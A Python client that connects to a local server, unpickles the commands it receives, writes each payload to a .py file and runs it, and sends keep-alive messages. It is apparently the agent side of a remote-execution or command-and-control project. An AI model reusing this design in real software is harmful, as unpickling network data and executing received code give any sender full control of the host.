import pickle
import socket
import subprocess
import sys
import threading
import traceback
import queue
import config
import select
import time

from Protocol import pack_data, unpack_data, KeepAlive, Disconnect

HEADER = 64
PORT = 5055
FORMAT = 'utf-8'
SERVER = "127.0.0.1"
ADDR = (SERVER, PORT)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.settimeout(3)
command_q=queue.Queue()
responses = queue.Queue()
client.connect(ADDR)
connected = True
threads=[]
inputs = [client]
cnt=1
config_path=config.PATH


def name_path(path,cnt):
    tmp="\python_file"+f"({cnt})"+".py"
    save_path=path+tmp
    cnt+=1
    return save_path


def pad_message(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    return send_length


def save_payload(input):
    save_path = name_path(config_path,cnt)
    file=open(save_path, "wb")
    file.write(input.command_payload)
    formatted_args = [f'r"{arg}"' for arg in input.command_payload_arguments]
    file.write(f'\n{input.command_type}({", ".join(formatted_args)})\n'.encode('utf-8'))
    file.close()


def run_payload(save_path):
    try:
        with subprocess.Popen(
                [sys.executable, save_path],
                stdout=subprocess.PIPE
        ) as proc:
            # send_msg('Running..')
            print(proc.stdout.read().decode('utf-8')) #base64 and send it to the server
        print('Finished')
        # send_msg('Finished')
        if proc.returncode != 0:
            print('Error')
            # send_msg('Error')
    except Exception as e:
        print(f'Exception executing python file: {e}\n{traceback.format_exc()}')


def execute_command(commands_queue):
    global connected
    while connected:
        try:
            cmd = commands_queue.get(timeout=5)
        except queue.Empty:
            continue

        save_payload(cmd)
        save_path = name_path(config_path, cnt)
        run_payload(save_path)


def keep_alive(time_out):
    global connected
    #try except
    ip, port = client.getsockname()
    alive_msg = KeepAlive(ip, port)
    while connected:
        responses.put(alive_msg)
        time.sleep(time_out)


def listen():
    global connected
    data = b''
    data_to_send = b''
    while connected:
        try:
            readables, writables, _ = select.select([client], [client], [])

            if client in readables:
                data += client.recv(1024)
                msgs, data = unpack_data(data)
                for msg in msgs:
                    cmd = pickle.loads(msg)
                    command_q.put(cmd)

            if client in writables:
                if not data_to_send:
                    next_msg = responses.get()
                    data_to_send = pack_data(pickle.dumps(next_msg))

                sent_bytes = client.send(data_to_send)
                data_to_send = data_to_send[sent_bytes:]

        except Exception as e:
            print(e)
            client.close()
            connected = False



def start():
    print(f"[LISTENING] Client has connected to on {SERVER}")
    threads.append(threading.Thread(target=listen))
    threads.append(threading.Thread(target=keep_alive, args=(config.KEEP_ALIVE_INTERVAL, )))
    threads.append(threading.Thread(target=execute_command, args=(command_q, )))
    for thread in threads:
        thread.start()

start()
input()
responses.put(Disconnect())
for thread in threads:
    thread.join()


